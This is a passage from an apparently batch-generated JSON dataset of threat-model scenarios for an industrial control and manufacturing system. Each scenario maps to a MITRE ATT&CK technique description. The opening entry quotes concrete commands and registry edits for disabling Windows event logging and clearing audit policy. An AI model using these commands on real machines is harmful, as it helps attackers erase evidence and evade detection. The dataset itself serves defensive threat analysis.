                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive operational data in the MES database is accessed without authorization.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access control policies.",
                    "Role": "System Administrator",
                    "Condition": "Access policies do not enforce least privilege."
                },
                {
                    "Assumption": "Lack of data encryption.",
                    "Role": "System Administrator",
                    "Condition": "Data stored is not encrypted."
                },
                {
                    "Assumption": "Inadequate monitoring of database access.",
                    "Role": "System Administrator",
                    "Condition": "Database access logs are not maintained or reviewed."
                }
            ],
            "Potential Impact": "Confidentiality breach leading to unauthorized data access.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Database Access",
                "Sensitive Data",
                "Encryption"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Interception of unencrypted data between field devices and the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Unencrypted communication over the network.",
                    "Role": "System Administrator",
                    "Condition": "Data transmitted in plaintext."
                },
                {
                    "Assumption": "Attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Network perimeter is not adequately protected."
                },
                {
                    "Assumption": "Inadequate encryption protocols.",
                    "Role": "System Administrator",
                    "Condition": "Outdated or no encryption mechanisms used."
                }
            ],
            "Potential Impact": "Confidentiality compromised with potential data leakage.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Data Interception",
                "Network Access",
                "Encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to stored cloud data through compromised cloud service accounts.",
            "Assumptions": [
                {
                    "Assumption": "Compromised cloud service user credentials.",
                    "Role": "Attacker",
                    "Condition": "Weak or phished credentials."
                },
                {
                    "Assumption": "Inadequate access controls and lack of multi-factor authentication.",
                    "Role": "System Administrator",
                    "Condition": "Weak authentication mechanisms."
                },
                {
                    "Assumption": "Cloud service does not monitor or log data accesses.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient activity logging in the cloud service."
                }
            ],
            "Potential Impact": "Confidentiality breach exposing sensitive stored data.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Cloud Access",
                "Sensitive Data",
                "Authentication"
            ],
            "mitre_technique": {
                "name": "Application Access Token",
                "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
                "id": "attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a",
                "technique_id": "T1527"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack on the control center's HMI and MES.",
            "Assumptions": [
                {
                    "Assumption": "Control center systems are connected to the internet.",
                    "Role": "System Administrator",
                    "Condition": "HMI and MES are exposed to the public internet."
                },
                {
                    "Assumption": "Lack of DDoS mitigation mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "No DDoS protection services in place."
                },
                {
                    "Assumption": "Insufficient network bandwidth and resilience.",
                    "Role": "System Administrator",
                    "Condition": "Network infrastructure is not robust."
                }
            ],
            "Potential Impact": "Availability compromised; system downtime for HMI and MES.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS",
                "System Downtime",
                "Network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of vulnerabilities in RTUs to cause service disruption.",
            "Assumptions": [
                {
                    "Assumption": "Exploitable vulnerabilities exist in RTU firmware.",
                    "Role": "Attacker",
                    "Condition": "Vulnerabilities are not patched."
                },
                {
                    "Assumption": "RTUs are exposed to outside networks.",
                    "Role": "Attacker",
                    "Condition": "RTUs can be accessed externally without adequate protection."
                },
                {
                    "Assumption": "No redundancy in RTU functionality.",
                    "Role": "System Administrator",
                    "Condition": "System cannot handle RTU failure gracefully."
                }
            ],
            "Potential Impact": "Availability affected; disruption in data collection and command execution.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Vulnerability Exploitation",
                "RTUs",
                "Service Disruption"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Overloading the gateway with excessive data traffic to cause a service outage.",
            "Assumptions": [
                {
                    "Assumption": "No rate-limiting or traffic shaping mechanisms on the gateway.",
                    "Role": "System Administrator",
                    "Condition": "Gateway does not filter traffic effectively."
                },
                {
                    "Assumption": "Gateway firmware or software has limitations in handling high traffic.",
                    "Role": "System Administrator",
                    "Condition": "Gateway hardware/software is not robust."
                },
                {
                    "Assumption": "Attacker can generate high volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "Attacker has the necessary resources to generate traffic."
                }
            ],
            "Potential Impact": "Availability compromised; outage in gateway functionality.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Gateway",
                "Traffic Overload",
                "Service Disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting software vulnerabilities in the control center to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Control center software has known vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Vulnerabilities are not patched."
                },
                {
                    "Assumption": "Attacker has initial access to the control center.",
                    "Role": "Attacker",
                    "Condition": "Attacker has bypassed the initial access controls."
                },
                {
                    "Assumption": "No granular access controls or monitoring.",
                    "Role": "System Administrator",
                    "Condition": "Access controls are not detailed."
                }
            ],
            "Potential Impact": "Integrity and confidentiality compromised through unauthorized administrative actions.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Software Vulnerability",
                "Administrative Access",
                "Control Center"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Abusing misconfigured permissions in the cloud services to gain higher access levels.",
            "Assumptions": [
                {
                    "Assumption": "Permissions are not configured according to the principle of least privilege.",
                    "Role": "System Administrator",
                    "Condition": "Permissions are overly permissive."
                },
                {
                    "Assumption": "Attacker has an account with some level of access.",
                    "Role": "Attacker",
                    "Condition": "Attacker has a foothold in the system."
                },
                {
                    "Assumption": "No ongoing review of permission configurations.",
                    "Role": "System Administrator",
                    "Condition": "Permissions are not regularly audited."
                }
            ],
            "Potential Impact": "Confidentiality and integrity compromised through misuse of elevated privileges.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Cloud Services",
                "Permission Misconfiguration",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting poorly secured PLCs to escalate privileges and control field devices.",
            "Assumptions": [
                {
                    "Assumption": "PLCs have weak security settings.",
                    "Role": "System Administrator",
                    "Condition": "PLCs are not properly secured."
                },
                {
                    "Assumption": "Attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Network defenses are weak."
                },
                {
                    "Assumption": "No monitoring of privileged actions on PLCs.",
                    "Role": "System Administrator",
                    "Condition": "Actions are not logged or monitored."
                }
            ],
            "Potential Impact": "Integrity and availability compromised through unauthorized control actions.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "PLCs",
                "Privileged Actions",
                "Field Devices"
            ],
            "mitre_technique": {
                "name": "Change Operating Mode",
                "description": "Adversaries may change the operating mode of a controller to gain additional access to engineering functions such as Program Download.   Programmable controllers typically have several modes of operation that control the state of the user program and control access to the controllers API. Operating modes can be physically selected using a key switch on the face of the controller but may also be selected with calls to the controllers API. Operating modes and the mechanisms by which they are selected often vary by vendor and product line. Some commonly implemented operating modes are described below:  \n\n* Program - This mode must be enabled before changes can be made to a devices program. This allows program uploads and downloads between the device and an engineering workstation. Often the PLCs logic Is halted, and all outputs may be forced off. (Citation: N.A. October 2017)  \n* Run - Execution of the devices program occurs in this mode. Input and output (values, points, tags, elements, etc.) are monitored and used according to the programs logic. [Program Upload](https://attack.mitre.org/techniques/T0845) and [Program Download](https://attack.mitre.org/techniques/T0843) are disabled while in this mode. (Citation: Omron) (Citation: Machine Information Systems 2007)  (Citation: N.A. October 2017) (Citation: PLCgurus 2021)   \n* Remote - Allows for remote changes to a PLCs operation mode. (Citation: PLCgurus 2021)    \n* Stop - The PLC and program is stopped, while in this mode, outputs are forced off. (Citation: Machine Information Systems 2007)   \n* Reset - Conditions on the PLC are reset to their original states. Warm resets may retain some memory while cold resets will reset all I/O and data registers. (Citation: Machine Information Systems 2007)   \n* Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system. Often monitor mode may be used as a trial for initialization. (Citation: Omron)",
                "id": "attack-pattern--2883c520-7957-46ca-89bd-dab1ad53b601",
                "technique_id": "T0858"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "23",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sends spoofed control commands to the RTUs, posing as the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Valid if network perimeter defenses are breached."
                },
                {
                    "Assumption": "The attacker possesses knowledge of the command formats.",
                    "Role": "Attacker",
                    "Condition": "Valid if reconnaissance is successful."
                },
                {
                    "Assumption": "The RTU lacks strong authentication mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Valid if no authentication is in place."
                }
            ],
            "Potential Impact": "Unauthorized commands could disrupt manufacturing processes or damage equipment.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "control command",
                "RTU"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a fake gateway to intercept and manipulate data between field devices and the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can insert the fake gateway into the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical access is possible."
                },
                {
                    "Assumption": "Field devices do not verify the identity of the gateway.",
                    "Role": "System Designer",
                    "Condition": "Valid if authentication is not implemented."
                },
                {
                    "Assumption": "There is no network monitoring of gateway anomalies.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if monitoring is insufficient."
                }
            ],
            "Potential Impact": "Data tampering leading to inaccurate analytics and possible equipment malfunctions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "gateway",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates cloud services to gain access to sensitive data stored in the cloud.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can spoof the cloud service identity.",
                    "Role": "Attacker",
                    "Condition": "Valid if SSL/TLS is not properly configured."
                },
                {
                    "Assumption": "The Management Console does not verify the identity of the cloud services.",
                    "Role": "System Designer",
                    "Condition": "Valid if lacking proper verification mechanisms."
                },
                {
                    "Assumption": "Outdated security certificates are in use.",
                    "Role": "System Administrator",
                    "Condition": "Valid if certificates are not regularly updated."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data, leading to potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud services",
                "data breach",
                "SSL/TLS"
            ],
            "mitre_technique": {
                "name": "Protocol Impersonation",
                "description": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. ",
                "id": "attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc",
                "technique_id": "T1001.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies sensor data in transit to the RTUs or Control Center to provide false information.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic between sensors and RTUs is unsecured.",
                    "Role": "System Designer",
                    "Condition": "Valid if no encryption is used."
                },
                {
                    "Assumption": "The attacker has access to network paths.",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is compromised."
                },
                {
                    "Assumption": "Data integrity checks are not implemented.",
                    "Role": "System Designer",
                    "Condition": "Valid if verification checks are omitted."
                }
            ],
            "Potential Impact": "Misleading data could cause incorrect decisions, leading to operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "sensor data",
                "network",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker physically accesses and modifies the configuration of field devices (PLCs).",
            "Assumptions": [
                {
                    "Assumption": "Field devices are located in unsecured areas.",
                    "Role": "Facility Manager",
                    "Condition": "Valid if areas are not properly secured."
                },
